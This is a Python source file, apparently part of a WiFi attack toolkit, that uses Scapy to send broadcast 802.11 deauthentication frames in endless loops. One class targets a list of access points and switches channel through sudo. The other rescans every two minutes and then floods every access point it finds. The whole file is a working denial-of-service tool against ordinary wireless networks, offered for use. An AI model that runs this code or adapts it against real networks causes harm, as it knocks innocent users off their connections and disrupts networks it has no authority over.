import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import socket
from subprocess import call
from threading import Thread
from time import sleep
import printings

# local imports
from scan import WifiScan

conf.verb = 0

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;93m"
T_YELLOW = "\033[0;93m"
NORMAL = "\033[0;0m"

class Deauth(object):
    def __init__(self, APs, interface):
        self.APs = APs
        self.interface = interface
        self.BROADCAST = "FF:FF:FF:FF:FF:FF"
        self.burst = 32

    def start_deauth(self):
        conf.iface = self.interface
        if 3 <= len(self.APs) < 5:
            self.burst = 10
        if len(self.APs) >= 7:
            self.burst = 3

        while True:
            for bssid in self.APs:
                packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                channel = self.APs[bssid]
                call("sudo iwconfig {iface} channel {ch}".format(iface=self.interface, ch=channel), shell=True)
                
                try:
                    send(packet, count=self.burst)
                except socket.error:
                    print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
                    sys.exit(0)
                
                print("[{G}+{N}] {pkt} frames sent to {Y}{bssid}{N}".format(pkt=self.burst, G=GREEN, N=NORMAL, Y=YELLOW, bssid=bssid.upper()))
                sleep(1)

class DeauthAll(object):
    def __init__(self, interface):
        self.interface = interface
        self.burst = 32
        self.BROADCAST = "FF:FF:FF:FF:FF:FF"
        self.deauth_active = False

    def start_deauth_all(self):
        def scan():
            call("sudo clear", shell=True)
            print("[{Y}*{N}] Scanning for new Access-Points... (8 sec.)".format(Y=YELLOW, N=NORMAL))
            
            self.deauth_active = False
            wifiscan.channelhop_active = True
            wifiscan.do_scan()
            wifiscan.channelhop_active = False
            self.APs = wifiscan.get_access_points()
            
            if len(self.APs) < 1:
                print("\n{R}No Access-Points found. :({N}\n".format(R=RED, N=NORMAL))
                thread.interrupt_main()

            printings.deauth_all()
            for bssid in self.APs:
                print(" {G}->{N}  {bssid} | {Y}{essid}{N}".format(G=GREEN, Y=T_YELLOW, N=NORMAL, bssid=bssid, essid=self.APs[bssid]["essid"]))

            self.deauth_active = True
            sleep(120)
            scan()

        conf.iface = self.interface

        wifiscan = WifiScan(self.interface)
        wifiscan.do_output = False
        wifiscan.timeout = 8

        hopT = Thread(target=wifiscan.channelhop, args=[])
        hopT.daemon = True
        hopT.start()

        scanT = Thread(target=scan, args=[])
        scanT.daemon = True
        scanT.start()

        while True:
            if self.deauth_active:
                if 1 < len(self.APs) < 5:
                    self.burst = 10
                elif 5 < len(self.APs):
                    self.burst = 3
                for bssid in self.APs:
                    packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                    send(packet, count=self.burst)
                sleep(1)

                    



